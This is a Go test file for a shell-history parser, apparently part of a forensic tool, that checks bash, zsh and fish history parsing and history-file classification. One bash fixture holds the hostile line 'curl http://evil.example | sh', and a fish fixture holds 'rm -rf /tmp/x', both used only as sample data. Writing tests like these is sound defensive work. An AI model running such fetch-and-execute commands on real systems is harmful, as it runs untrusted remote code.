package shell

import (
	"bytes"
	"encoding/json"
	"strings"
	"testing"

	"github.com/get-sybers/gopinfo/record"
)

func parse(t *testing.T, shell, content string) []map[string]any {
	t.Helper()
	var buf bytes.Buffer
	w := record.NewWriter(&buf)
	if _, err := parseHistory(strings.NewReader(content), shell, w); err != nil {
		t.Fatal(err)
	}
	w.Flush()
	var out []map[string]any
	for _, l := range strings.Split(strings.TrimSpace(buf.String()), "\n") {
		if l == "" {
			continue
		}
		var m map[string]any
		json.Unmarshal([]byte(l), &m)
		out = append(out, m)
	}
	return out
}

func TestBashPlainAndStamped(t *testing.T) {
	recs := parse(t, "bash", "ls -la\n#1767225600\ncurl http://evil.example | sh\nwhoami\n")
	if len(recs) != 3 {
		t.Fatalf("count %d", len(recs))
	}
	if recs[0]["Command"] != "ls -la" || recs[0]["EventTime"] != nil {
		t.Fatalf("plain: %v", recs[0])
	}
	if recs[1]["Command"] != "curl http://evil.example | sh" ||
		recs[1]["EventTime"] != "2026-01-01T00:00:00.000000Z" || recs[1]["TimeKind"] != "command" {
		t.Fatalf("stamped: %v", recs[1])
	}
	if recs[2]["EventTime"] != nil { // the stamp applies to ONE command only
		t.Fatalf("stamp leaked: %v", recs[2])
	}
	if recs[2]["Sequence"] != float64(3) {
		t.Fatalf("sequence: %v", recs[2])
	}
}

func TestZshExtendedAndMetafied(t *testing.T) {
	// metafied 'é' (UTF-8 c3 a9): zsh writes c3 as 0x83,0xe3 — build raw bytes
	raw := append([]byte(": 1767225600:5;echo "), 0x83, 0xe3, 0xa9)
	raw = append(raw, '\n')
	raw = append(raw, []byte("plain-format-line\n")...)
	recs := parse(t, "zsh", string(raw))
	if len(recs) != 2 {
		t.Fatalf("count %d: %v", len(recs), recs)
	}
	if recs[0]["Command"] != "echo é" || recs[0]["EventTime"] != "2026-01-01T00:00:00.000000Z" ||
		recs[0]["Elapsed"] != float64(5) {
		t.Fatalf("extended: %v", recs[0])
	}
	if recs[1]["Command"] != "plain-format-line" || recs[1]["EventTime"] != nil {
		t.Fatalf("plain zsh: %v", recs[1])
	}
}

func TestFish(t *testing.T) {
	content := "- cmd: git push origin main\n  when: 1767225600\n" +
		"- cmd: rm -rf /tmp/x\n  when: 1767225700\n  paths:\n    - /tmp/x\n"
	recs := parse(t, "fish", content)
	if len(recs) != 2 || recs[0]["Command"] != "git push origin main" ||
		recs[0]["EventTime"] != "2026-01-01T00:00:00.000000Z" ||
		recs[1]["Command"] != "rm -rf /tmp/x" {
		t.Fatalf("fish: %v", recs)
	}
}

func TestClassify(t *testing.T) {
	cases := map[string]string{
		"home/alice/.bash_history":                "bash",
		"root/.zsh_history":                       "zsh",
		"home/bob/.local/share/fish/fish_history": "fish",
		"home/alice/.python_history":              "python",
		"home/alice/.mysql_history":               "mysql",
		"home/alice/.bash_profile":                "",
		"home/alice/.zsh_history.bak":             "",
		"var/log/syslog":                          "",
	}
	for in, want := range cases {
		if got := classify(in); got != want {
			t.Errorf("classify(%q) = %q, want %q", in, got, want)
		}
	}
}
